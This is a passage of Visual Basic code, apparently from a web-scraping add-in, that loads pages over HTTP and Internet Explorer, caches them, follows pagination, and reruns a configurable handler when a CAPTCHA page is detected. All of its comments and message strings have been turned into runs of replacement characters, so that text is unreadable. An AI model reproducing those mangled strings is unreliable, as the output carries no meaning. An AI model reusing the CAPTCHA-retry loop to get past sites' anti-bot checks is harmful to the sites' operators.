                            AAset_NAME_ONCAPTCHA$ & "|fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Captcha", bt_Warning
                    End If
                    
                Else    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                    If WP.Options.CaptchaShowPopup Then AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (" & WP.Options.CaptchaAttempts & _
                        ") |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & vbNewLine & "<a href='" & RequestURL$ & "'>" & CropURL(RequestURL$, 30) & "</a>", bt_Warning
                    
                End If
            End If
            
            
            If POST Then
                If TEST_ACTIONS_MODE Then
                    AddBalloon "<b>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| POST |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|</b> " & CreateHTMLlink(RequestURL$) & "<br />" & _
                        "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & Len(LoadFromURL_HTML) & ";  |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & Format((time2 - time1) / 1000, "0.0") & " |fffd||fffd||fffd|.<br />" & _
                        "POST-|fffd||fffd||fffd||fffd||fffd||fffd|: " & FormatTextForBalloon(PostData$), bt_Information
                End If
                ResponseHeaders$ = "": ResponseHeaders$ = .GetAllResponseHeaders
                SaveCookiesFromResponseHeaders ResponseHeaders$
            End If
        End If
        
        If WriteCache Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
            ResponseHeadersSuffix$ = ""
            If NonDirectQuery Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                ResponseHeadersSuffix$ = "StatusCode=" & http.Status & vbNewLine & "URL=" & http.Option(WinHttpRequestOption_URL) & vbNewLine & vbNewLine & _
                    DecodeUTF8(http.GetAllResponseHeaders)
                ResponseHeadersSuffix$ = "<ResponseHeaders>" & ResponseHeadersSuffix$ & "</ResponseHeaders>"
            End If
            If Len(LoadFromURL_HTML) Then
                Set ts = FSO.CreateTextFile(CacheFilename$, True, True)
                ts.Write LoadFromURL_HTML & ResponseHeadersSuffix$: ts.Close
            End If
            Set ts = Nothing: Set FSO = Nothing
        End If
        CleanHTML LoadFromURL_HTML
        
        RequestLastTime = GetTickCount
    End With
End Function

Function LoadFromURL_usingPager(ByVal RequestURL$, Optional ByRef WP As WebsiteParser, _
        Optional ByVal Encoding$ = "", Optional ByVal pager$ = "", _
        Optional ByVal ASet_name$ = "", Optional ByVal CacheMode$ = "") As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| RequestURL$, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| GET-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Pager$ (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, ?page=2,  ?page=5 |fffd| |fffd|.|fffd|.)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim PagerMinValue&
    PagerMinValue& = Val(Split(pager$, "=")(1))
    
    pager$ = Split(pager$, "=")(0)
    pager$ = Split(pager$, "&")(1)
    pager$ = Split(pager$, "?")(1)
    If pager$ = "" Then
        LoadFromURL_usingPager = LoadFromURL_HTML(RequestURL$, WP, Encoding$, , CacheMode$)
        'If Len(ASet_name$) Then WP.AASets.GetItemByName(ASet_name$).Execute LoadFromURL_usingPager
        Exit Function
    End If
    If StopMacro Then Exit Function
    
    If TEST_ACTIONS_MODE Then WP.CreateTemporaryProgressIndicator
    WP.PrInd1.ShowExtraBar "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", True
    
    ' dic - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Dim dic As New Dictionary, key
    LoadAllPages RequestURL$, dic, pager$, PagerMinValue&, WP, Encoding$, ASet_name$, CacheMode$
    For Each key In dic.Keys
        If Val(key) >= PagerMinValue& Then
            LoadFromURL_usingPager = LoadFromURL_usingPager & IIf(Len(LoadFromURL_usingPager) > 0, ARSEP, "") & dic.item(key)
        End If
    Next
    
    WP.PrInd1.HideExtraBar
End Function

Function LoadAllPages(ByVal RequestURL$, ByRef dic As Dictionary, _
        ByVal pager$, ByRef PagerMinValue As Long, _
        Optional ByRef WP As WebsiteParser, Optional ByRef Encoding$ = "", _
        Optional ByVal ASet_name$ = "", Optional ByVal CacheMode$ = "")
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| DIC
    On Error Resume Next
    Dim html$, coll As New Collection, pager_value, pv&, URL$
    html$ = LoadFromURL_HTML(RequestURL$, WP, Encoding$, , CacheMode$)
    If WP.Options.RemoveScripts Then html$ = RemoveTags(html$, "script")
    If WP.Options.RemoveIFrames Then html$ = RemoveTags(html$, "iframe")
    If StopMacro Then Exit Function
    
    'If Len(ASet_name$) Then WP.AASets.GetItemByName(ASet_name$).Execute html$
    If StopMacro Then Exit Function
    
    pv& = GetPagerValueFromURL(RequestURL$, pager$)
    dic.item(pv&) = html$
    'Debug.Print "Load page for pager value = " & pv& & ",  len(HTML) = " & Len(HTML$)
    
    With WP.PrInd1
        If Not .FP.ShowExtraBar Then .ShowExtraBar "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", True
        .ExtraBar_SetLineText 2, tt("PI_ShowMessage_ProcessingPage") & " " & dic.Count & ",  |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & pager$ & "=" & pv&
        .ExtraBar_SetLineText 3, "|fffd||fffd||fffd||fffd||fffd||fffd|: " & RequestURL$
        DoEvents
    End With
    
    ' WP.PrInd1.ShowMessage tt("PI_ShowMessage_ProcessingPage") & " " & pager$ & "=" & pv&
    DoEvents
    
    Set coll = FindPagerValuesFromHTML(html$, RequestURL$, pager$)
    'WP.PrInd1.ExtraBar_SetLineText 4, IIf(coll.Count, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (" & coll.Count & ")", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
    
    If coll.Count Then
        'Debug.Print RequestURL$
        For Each pager_value In coll
            'Debug.Print "pager_value=" & pager_value
            If StopMacro Then Exit Function
            pv& = Val(pager_value)
            If pv& >= PagerMinValue Then
                If Not dic.Exists(pv&) Then
                    URL$ = SetPagerValueIntoURL(RequestURL$, pager$, pv&)
                    'Debug.Print URL$
                    DoEvents
                    LoadAllPages URL$, dic, pager$, PagerMinValue&, WP, Encoding$, ASet_name$, CacheMode$
                End If
            End If
        Next
    End If
End Function

Function FindPagerValuesFromHTML(ByVal html$, ByVal SourceUrl$, ByVal pager$) As Collection
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| DIC
    On Error Resume Next
    Set FindPagerValuesFromHTML = New Collection
    Dim Mask$, Links$, link, pv&
    Mask$ = "*[?&/]" & pager$ & IIf(pager$ Like "*?/", "", "[/=]") & IIf(InStr(1, pager$, "#") > 0, "", "#") & "*"
    'MsgBox Mask$, , pager$
    DoEvents
    Links$ = GetAllLinks(html$, Mask$)
    If Links$ = "" Then Exit Function
    DoEvents
    'MsgBox UBound(Split(Links$, ARSEP))
    
    For Each link In Split(Links$, ARSEP)
        pv& = GetPagerValueFromURL(CStr(link), pager$)
        ' Debug.Print pv&
        FindPagerValuesFromHTML.Add pv&, CStr(pv&)
        DoEvents
    Next
End Function

Function GetPagerValueFromURL(ByVal URL$, ByVal pager$) As Long
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|
    On Error Resume Next
    Dim sep$
    Select Case True
        Case InStr(1, URL$, "?" & pager$ & "=", vbTextCompare) > 0: sep$ = "?" & pager$ & "="
        Case InStr(1, URL$, "&" & pager$ & "=", vbTextCompare) > 0: sep$ = "&" & pager$ & "="
        Case InStr(1, URL$, "/" & pager$ & IIf(pager$ Like "*?/", "", "/"), vbTextCompare) > 0: sep$ = "/" & pager$ & IIf(pager$ Like "*?/", "", "/")
        Case Else
            Dim PagerMetrics As New Dictionary
            PagerMetrics.CompareMode = TextCompare
            CalculatePagerMetrics Array(URL$), pager$, PagerMetrics
            GetPagerValueFromURL = Val(PagerMetrics.item("min"))    '  .item("max")
            Set PagerMetrics = Nothing
            Exit Function
    End Select
    
    ' GET-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Pager$ |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| URL
    GetPagerValueFromURL = Val(Split(URL$, sep$)(1))
End Function

Function SetPagerValueIntoURL(ByVal URL$, ByVal pager$, ByVal PagerValue&) As String
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| GET-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Pager$ - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    'Debug.Print pager$, PagerValue&, URL$
    Dim sep$, arr, suffix$, txt$, BaseURL$
    Select Case True
        Case InStr(1, URL$, "?" & pager$ & "=", vbTextCompare) > 0: sep$ = "?" & pager$ & "="
        Case InStr(1, URL$, "&" & pager$ & "=", vbTextCompare) > 0: sep$ = "&" & pager$ & "="
        Case InStr(1, URL$, "/" & pager$ & IIf(pager$ Like "*?/", "", "/"), vbTextCompare) > 0: sep$ = "/" & pager$ & IIf(pager$ Like "*?/", "", "/")
        Case Else: sep$ = ""
    End Select
    ' Debug.Print "pager$=" & pager$, "sep$=" & sep$
    
    If Len(sep$) Then
        ' GET-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Pager$ |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| URL - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        arr = Split(URL$, sep$)
        If UBound(arr) > 1 Then
            SetPagerValueIntoURL = arr(0) & sep$ & PagerValue&        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| - 2 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Else
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
            If arr(1) Like "*&*" Then suffix$ = "&" & Split(arr(1), "&", 2)(1)
            SetPagerValueIntoURL = arr(0) & sep$ & PagerValue& & suffix$
        End If
    Else
        ' GET-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Pager$ |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| URL - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|
        If pager$ Like "*/*" Then
            BaseURL$ = URL$
            If InStr(1, pager$, "#") > 0 Then
                txt$ = Replace(pager$, "#", PagerValue&)
                BaseURL$ = Split(URL$, Split(pager$, "#")(0))(0)
            Else
                txt$ = pager$ & PagerValue&
            End If
            If txt Like "/*" Then txt = Mid(txt, 2)
            'Debug.Print BaseURL$
            SetPagerValueIntoURL = BaseURL$ & IIf((pager$ Like "/?*") Or (Right(BaseURL$, 1) = "/"), "", "/") & txt$
        ElseIf URL$ Like "*[?]*=*" Then
            SetPagerValueIntoURL = URL$ & "&" & pager$ & "=" & PagerValue&
        Else
            SetPagerValueIntoURL = URL$ & "?" & pager$ & "=" & PagerValue&
        End If
    End If
End Function


Function LoadFromURL_IE(ByVal RequestURL$, Optional PageMask$, Optional ByRef WP As WebsiteParser) As QUERY_RESULT
    On Error Resume Next
    Dim CacheFilename$, time1 As Long, time2 As Long, FSO As Object, ts As Object, t As Double
    LoadFromURL_IE.URL = RequestURL$
    
    Dim CacheFolder$, Timeout&, UseCache As Boolean, WriteCache As Boolean, UseCacheBefore As Boolean
    Dim txt_captcha$, AAset_NAME_ONCAPTCHA$, CaptchaAttemptsCount&
    
    If WP Is Nothing Then Set WP = New WebsiteParser: WP.Options.UseCache = 0
    If WP.Options.UseCache Then CacheFolder$ = WP.GetCacheFolderPath
    Timeout& = WP.Options.RequestTimeout
    
    'UseCache = CBool(WP.Options.UseCache) And (Len(CacheFolder$) > 0) And FolderExists(CacheFolder$)
    
    Select Case WP.Options.UseCache
        Case 0
            UseCache = False: WriteCache = False
        Case 1
            UseCache = True: WriteCache = True
        Case 2
            UseCache = False: WriteCache = True
    End Select
    
    If UseCache Or WriteCache Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        CacheFolder$ = WP.GetCacheFolderPath    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        If (Len(CacheFolder$) = 0) Or Not (FolderExists(CacheFolder$)) Then
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            UseCache = False: WriteCache = False
        End If
    End If
    UseCacheBefore = UseCache    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    
Label_LoadFromURL_IE:
    
    If UseCache Or WriteCache Then    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Set FSO = CreateObject("scripting.filesystemobject")
        CacheFilename$ = "IE=" & FWF.Replace_symbols(Replace(Replace(RequestURL$, "http://", ""), "/", "|fffd|")) & ".txt"
    End If
    
    If UseCache Then
        time1 = GetTickCount
        
        If FileExists(CacheFolder$ & CacheFilename$) Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|
            Set ts = FSO.OpenTextFile(CacheFolder$ & CacheFilename$, 1, True, True)
            LoadFromURL_IE.text = ts.ReadAll        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            ts.Close: Set ts = Nothing
            time2 = GetTickCount
            LoadFromURL_IE.StatusCode = 200
            LoadFromURL_IE.FromCache = True
            LoadFromURL_IE.Time = time2 - time1
            
            If WP.CaptchaDetected(LoadFromURL_IE.text) Then
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                UseCache = False
                If WP.Options.CaptchaShowPopup Then AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| <a href='" & RequestURL$ & "'>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</a>" & _
                    vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", bt_Attention
                GoTo Label_LoadFromURL_IE
            End If
            
            Exit Function
        End If
    End If
    
    WP.WaitAPause
    time1 = GetTickCount
    
    
    Dim timerstart As Double, PageText$, loopscount&
    timerstart = Timer: If Timeout& <= 0 Then Timeout& = 2
    
IE_Start_Label:
    If Not RequestURL$ Like "javascript:*" Then
        IE.document.body.outerHTML = ""
        Err.Clear
        
        IE.Navigate "about:blank"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| IE... |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|...
        WaitForIE Timeout&
    End If
    
    IE.Navigate RequestURL$
    ' Debug.Print "IE: Busy = " & IE.Busy & ",  readyState = " & IE.readyState
    
    WaitForIE Timeout&
    ' Debug.Print "IE: Busy = " & IE.Busy & ",  readyState = " & IE.readyState
    If Err.Number = 462 Then
        loopscount& = loopscount& + 1
        If loopscount& = 1 Then
            IE.Quit
            Set IE = New SHDocVw.InternetExplorer
            Err.Clear
            GoTo IE_Start_Label
        End If
    End If
    'If Err Then Debug.Print Err.Number, Err.Description
    
    If (Len(PageMask$) > 0) And (IE.Busy = False) And (IE.readyState = 4) Then
        Do While Abs(Timer - timerstart) < Timeout&
            DoEvents: PageText$ = "": PageText$ = IE.document.body.outerHTML
            If PageText$ Like "*" & PageMask$ & "*" Then Exit Do        'Debug.Print "condition = |fffd||fffd|": Exit Do
        Loop
    End If
    
    'Debug.Print "Request Timeout (" & timeout& & " seconds)", RequestURL$        ' Request Timeout (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    
    LoadFromURL_IE.text = IE.document.body.outerHTML
    
Label_CheckCaptcha_IE:
    
    If StopMacro Then Exit Function
    If WP.CaptchaDetected(LoadFromURL_IE.text) Then
        If CaptchaAttemptsCount& <= WP.Options.CaptchaAttempts Then
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ACTION_SET_NAME_ONCAPTCHA, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            
            ParserVariables.item("%" & CAPTCHA_URL_VAR_NAME$ & "%") = RequestURL$
            AAset_NAME_ONCAPTCHA$ = WP.Options.CaptchaHandler
            
            If WP.AASets.Exists(AAset_NAME_ONCAPTCHA$) Then
                CaptchaAttemptsCount& = CaptchaAttemptsCount& + 1
                
                If WP.Options.CaptchaShowPopup And (CaptchaAttemptsCount& = 1) Then AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| IE"    '& _
                vbNewLine & "<a href='" & RequestURL$ & "'>" & _
                    CropURL(RequestURL$, 30) & "</a>" & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", bt_Information
                
                If WP.Options.CaptchaShowPopup And (CaptchaAttemptsCount& > 1) Then
                    AddBalloon "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & CaptchaAttemptsCount& & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", bt_Information
                End If
                
                txt_captcha$ = LoadFromURL_IE.text
                StopCaptchaRequests = True
                WP.AASets.GetItemByName(AAset_NAME_ONCAPTCHA$).Execute txt_captcha$
                StopCaptchaRequests = False
                
                
                If UseCacheBefore Then WriteCache = True    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                
                If WP.Options.CaptchaReloadPage Then
                    GoTo Label_LoadFromURL_IE
                Else
                    LoadFromURL_IE.text = txt_captcha$
                    GoTo Label_CheckCaptcha_IE
                End If
                
            Else
